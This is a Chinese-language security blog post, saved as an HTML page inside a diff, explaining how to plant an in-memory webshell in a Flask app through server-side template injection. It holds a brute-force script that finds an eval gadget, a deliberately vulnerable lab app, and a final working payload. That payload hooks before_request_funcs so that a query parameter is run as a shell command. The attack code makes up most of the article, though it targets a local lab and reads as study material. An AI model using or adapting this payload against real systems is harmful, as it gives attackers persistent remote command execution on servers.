@@ -1,0 +1,256 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>flask_ssti内存马 | ivory's blog</title><meta name="author" content="ivory"><meta name="copyright" content="ivory"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="flask_ssti内存马https:&#x2F;&#x2F;www.cnblogs.com&#x2F;gxngxngxn&#x2F;p&#x2F;18181936这里的内存不是二进制那些高深的概念就是改变某些在请求过程中，会起到作用的属性和方法，从而达到我们的目的写内存马的前提不同于文件马需要实现的是代码执行而不是文件读写 利用脚本找出ssti中存在的evalimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="flask_ssti内存马">
+<meta property="og:url" content="http://ireel.github.io/2025/07/16/flask-memory-shell/index.html">
+<meta property="og:site_name" content="ivory&#39;s blog">
+<meta property="og:description" content="flask_ssti内存马https:&#x2F;&#x2F;www.cnblogs.com&#x2F;gxngxngxn&#x2F;p&#x2F;18181936这里的内存不是二进制那些高深的概念就是改变某些在请求过程中，会起到作用的属性和方法，从而达到我们的目的写内存马的前提不同于文件马需要实现的是代码执行而不是文件读写 利用脚本找出ssti中存在的evalimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://ireel.github.io/img/logo/Python.png">
+<meta property="article:published_time" content="2025-07-16T09:39:48.000Z">
+<meta property="article:modified_time" content="2025-07-16T09:45:07.880Z">
+<meta property="article:author" content="ivory">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://ireel.github.io/img/logo/Python.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "flask_ssti内存马",
+  "url": "http://ireel.github.io/2025/07/16/flask-memory-shell/",
+  "image": "http://ireel.github.io/img/logo/Python.png",
+  "datePublished": "2025-07-16T09:39:48.000Z",
+  "dateModified": "2025-07-16T09:45:07.880Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ivory",
+      "url": "http://ireel.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/head.jpg"><link rel="canonical" href="http://ireel.github.io/2025/07/16/flask-memory-shell/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'flask_ssti内存马',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/custom.css"><script src="/js/custom.js"></script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/Commedia/videoframe_68476.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/novel/"><i class="fa-fw fas fa-book"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/logo/Python.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ivory's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">flask_ssti内存马</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/novel/"><i class="fa-fw fas fa-book"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">flask_ssti内存马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-16T09:39:48.000Z" title="发表于 2025-07-16 17:39:48">2025-07-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-16T09:45:07.880Z" title="更新于 2025-07-16 17:45:07">2025-07-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86/">知识</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="flask-ssti内存马"><a href="#flask-ssti内存马" class="headerlink" title="flask_ssti内存马"></a>flask_ssti内存马</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a><br>这里的内存不是二进制那些高深的概念<br>就是改变某些在请求过程中，<br>会起到作用的属性和方法，从而达到我们的目的<br>写内存马的前提不同于文件马<br>需要实现的是代码执行而不是文件读写</p>
+<h3 id="利用脚本找出ssti中存在的eval"><a href="#利用脚本找出ssti中存在的eval" class="headerlink" title="利用脚本找出ssti中存在的eval"></a>利用脚本找出ssti中存在的eval</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000?name=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">400</span>):</span><br><span class="line">    payload=<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;].__init__.__globals__.__builtins__.eval(&#x27;print(0)&#x27;)&#125;&#125;&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(().__class__.__base__.__subclasses__()[i])</span><br></pre></td></tr></table></figure>
+<p>那么我们就成功拿到了一个代码执行的payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[<span class="number">104</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&#x27;print(0)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取回显的方式"><a href="#获取回显的方式" class="headerlink" title="获取回显的方式"></a>获取回显的方式</h3><p><img src="/2025/07/16/flask-memory-shell/5.png" alt="alt text"></p>
+<h3 id="示例：before-request"><a href="#示例：before-request" class="headerlink" title="示例：before_request"></a>示例：before_request</h3><p>靶场源码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;Guest&#x27;</span>)</span><br><span class="line">    template = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;SSTI示例&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Hello <span class="subst">&#123;name&#125;</span>!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+<h5 id="获取到app（Flask对象）"><a href="#获取到app（Flask对象）" class="headerlink" title="获取到app（Flask对象）"></a>获取到app（Flask对象）</h5><p>使用<code>Python</code>的内置核心模块<code>sys</code>来获取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys是Python 的一个内置核心模块，</span><br><span class="line">而sys.modules是一个记录了“当前Python程序加载了哪些模块”的“全局花名册”。</span><br><span class="line">通过这个花名册，我们能找到主程序，</span><br><span class="line">并拿到主程序里定义的全局变量，其中就包括 app。</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<h5 id="获取定制回显"><a href="#获取定制回显" class="headerlink" title="获取定制回显"></a>获取定制回显</h5><p>使用before_request钩子的场景<br><a target="_blank" rel="noopener" href="https://geek-docs.com/flask/flask-questions/69_flask_python_flask_after_request_and_before_request_for_a_specific_set_of_request.html">https://geek-docs.com/flask/flask-questions/69_flask_python_flask_after_request_and_before_request_for_a_specific_set_of_request.html</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>():</span><br><span class="line">    <span class="comment"># 执行一些操作，例如进行身份验证</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.headers.get(<span class="string">&quot;Authorization&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">401</span></span><br></pre></td></tr></table></figure>
+<p>源码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>(<span class="params">self, f: T_before_request</span>) -&gt; T_before_request:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Register a function to run before each request.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    For example, this can be used to open a database connection, or</span></span><br><span class="line"><span class="string">    to load the logged in user from the session.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. code-block:: python</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @app.before_request</span></span><br><span class="line"><span class="string">        def load_user():</span></span><br><span class="line"><span class="string">            if &quot;user_id&quot; in session:</span></span><br><span class="line"><span class="string">                g.user = db.session.get(session[&quot;user_id&quot;])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The function will be called without any arguments. If it returns</span></span><br><span class="line"><span class="string">    a non-``None`` value, the value is handled as if it was the</span></span><br><span class="line"><span class="string">    return value from the view, and further request handling is</span></span><br><span class="line"><span class="string">    stopped.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This is available on both app and blueprint objects. When used on an app, this</span></span><br><span class="line"><span class="string">    executes before every request. When used on a blueprint, this executes before</span></span><br><span class="line"><span class="string">    every request that the blueprint handles. To register with a blueprint and</span></span><br><span class="line"><span class="string">    execute before every request, use :meth:`.Blueprint.before_app_request`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="variable language_">self</span>.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure>
+<p>也就是说编写在用户自己的应用里的before_request函数，<br>会作为一个函数（f）添加进before_request_funcs里<br>这些函数会在请求进入真正的接口前执行</p>
+<p>如果这些函数没有返回值（<code>None</code>）则成功进入接口<br>否则回显对应的返回值，那我们就可以使用<code>lambda</code>表达式定制自己的回显了<br>payload:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> :xxx)</span><br></pre></td></tr></table></figure>
+
+<h5 id="配合ssti写入内存马"><a href="#配合ssti写入内存马" class="headerlink" title="配合ssti写入内存马"></a>配合ssti写入内存马</h5><p>把上述的获取方式拼接一下得到内存马的payload：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;ivory&#x27;)).read())&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>结合上面到<code>eval</code>的payload，拼起来就是：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">104</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;ivory&#x27;)).read())&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>但是利用这个payload会出现报错<br><img src="/2025/07/16/flask-memory-shell/6.png" alt="alt text"><br>因为外面的<code>flask</code>并不在<code> lambda</code>函数的执行环境中<br>所以接收命令的部分需要额外加一个<code>import</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;flask&#x27;</span>).request.args.get(<span class="string">&#x27;ivory&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>最终payload:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">104</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;ivory&#x27;)).read())&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://ireel.github.io">ivory</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://ireel.github.io/2025/07/16/flask-memory-shell/">http://ireel.github.io/2025/07/16/flask-memory-shell/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://ireel.github.io" target="_blank">ivory's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/python/">python</a></div><div class="post-share"><div class="social-share" data-image="/img/logo/Python.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/06/10/Upload-LFI-plus/" title="Upload_LFI补课"><img class="cover" src="/img/upload.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Upload_LFI补课</div></div><div class="info-2"><div class="info-item-1">upload_lab补测常见绕过 前端拦截  前端都是纸老虎简单的话就使用console修改前端js实现复杂的话就上传一个正常文件，然后修改流量包  MIME类型判断  例如限制了 Content-Type: image/png 那么直接在上传木马时修改成对应的即可不会影响文件的使用  黑名单（过滤不全）  那么可以解析为php的文件后缀有很多常见的： php,php3,php4,php5,phtml   黑名单（过滤全木马）  上传.htaccess文件可以让更多的文件类型解析为php示例： &lt;Directory /&gt;  Options +Indexes +FollowSymLinks +ExecCGI  AllowOverride All  Order allow,deny  Allow from all  Require all granted&lt;/Directory&gt;  上传.user.ini文件 auto_prepend_file=test.txt   文件名处理逻辑  加点，加空格，双写，0x00阶段不重复写了 LFIphp...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ivory</div><div class="author-info-description">或许你的思绪也能存活千年</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ireel"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#flask-ssti%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">flask_ssti内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E6%89%BE%E5%87%BAssti%E4%B8%AD%E5%AD%98%E5%9C%A8%E7%9A%84eval"><span class="toc-number">1.0.1.</span> <span class="toc-text">利用脚本找出ssti中存在的eval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9B%9E%E6%98%BE%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.2.</span> <span class="toc-text">获取回显的方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9Abefore-request"><span class="toc-number">1.0.3.</span> <span class="toc-text">示例：before_request</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%B0app%EF%BC%88Flask%E5%AF%B9%E8%B1%A1%EF%BC%89"><span class="toc-number">1.0.3.0.1.</span> <span class="toc-text">获取到app（Flask对象）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AE%9A%E5%88%B6%E5%9B%9E%E6%98%BE"><span class="toc-number">1.0.3.0.2.</span> <span class="toc-text">获取定制回显</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%85%8D%E5%90%88ssti%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.0.3.0.3.</span> <span class="toc-text">配合ssti写入内存马</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/16/flask-memory-shell/" title="flask_ssti内存马"><img src="/img/logo/Python.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="flask_ssti内存马"/></a><div class="content"><a class="title" href="/2025/07/16/flask-memory-shell/" title="flask_ssti内存马">flask_ssti内存马</a><time datetime="2025-07-16T09:39:48.000Z" title="发表于 2025-07-16 17:39:48">2025-07-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/10/Upload-LFI-plus/" title="Upload_LFI补课"><img src="/img/upload.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Upload_LFI补课"/></a><div class="content"><a class="title" href="/2025/06/10/Upload-LFI-plus/" title="Upload_LFI补课">Upload_LFI补课</a><time datetime="2025-06-10T12:39:58.000Z" title="发表于 2025-06-10 20:39:58">2025-06-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/06/sql-plus/" title="sql注入补课"><img src="/img/sql.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sql注入补课"/></a><div class="content"><a class="title" href="/2025/06/06/sql-plus/" title="sql注入补课">sql注入补课</a><time datetime="2025-06-06T08:23:19.000Z" title="发表于 2025-06-06 16:23:19">2025-06-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/05/2025d3ctf/" title="d3ctf复现"><img src="/img/logo/d3ctf.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="d3ctf复现"/></a><div class="content"><a class="title" href="/2025/06/05/2025d3ctf/" title="d3ctf复现">d3ctf复现</a><time datetime="2025-06-05T12:35:33.000Z" title="发表于 2025-06-05 20:35:33">2025-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/10/java-cb1/" title="java链子分析—CommonsBeanutils1"><img src="/img/logo/Java.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java链子分析—CommonsBeanutils1"/></a><div class="content"><a class="title" href="/2025/05/10/java-cb1/" title="java链子分析—CommonsBeanutils1">java链子分析—CommonsBeanutils1</a><time datetime="2025-05-10T11:31:53.000Z" title="发表于 2025-05-10 19:31:53">2025-05-10</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/Commedia/videoframe_248026.png);"><div id="footer-wrap"><div class="copyright">&copy;2025 By ivory</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" 